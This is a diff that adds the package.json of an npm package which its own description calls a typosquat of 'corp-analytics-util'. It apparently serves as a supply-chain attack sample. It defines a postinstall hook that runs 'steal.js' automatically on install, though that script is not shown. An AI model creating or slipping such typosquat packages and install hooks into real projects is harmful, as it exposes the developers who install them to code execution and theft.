@@ -1,0 +1,9 @@
+{
+  "name": "corp-analytics-utils",
+  "version": "1.4.2",
+  "description": "analytics helpers (typosquat of corp-analytics-util)",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node steal.js"
+  }
+}
